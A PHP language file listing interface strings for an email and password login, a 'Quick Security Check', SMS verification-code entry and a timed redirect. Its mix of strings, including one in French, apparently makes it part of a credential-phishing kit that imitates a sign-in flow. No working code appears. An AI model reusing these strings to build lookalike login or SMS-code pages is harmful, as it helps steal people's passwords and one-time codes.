<?php
	$lg_cm = [
		"top1" => "E-mail address",
		"top2" => "Forgot email?",
		"top3" => "next",
		"top4" => "Create an account",
		"top5" => "English",
		"top6" => "Contact",
		"top7" => "Privacy",
		"top8" => "Legal",
		"top9" => "International",
		"tog1" => "OR",
		"tops11" => "Change",
		"tops12" => "Login",
		"tops13" => "Password",
		"tsopf14" => "Quick Security Check",
		"tsopf15" => "We just need some additional info to confirm it's you.",
		"tsopf16" => "Receive a text  ",
		"tsopf17" => "By continuing, you confirm that you are authorized to use this phone number and agree to receive text messages to confirm your identity.",
		"astop19" => "Quick Security Check",
		"astop20" => "Please wait while we load the page for you. We're working on it and it shouldn't take long. Thank you for your patience.",

		"lto1" => "You will be redirected to the sign-in page after 5 seconds... ",
		"lto5" => "Verification completed.",
		"xto6" => "Type in your code",
		"xto8" => "We sent a security code to your phone number.",
		"xto9" => "Continue",
		"mo01" => "Code SMS invalide!",
	

	];
	?>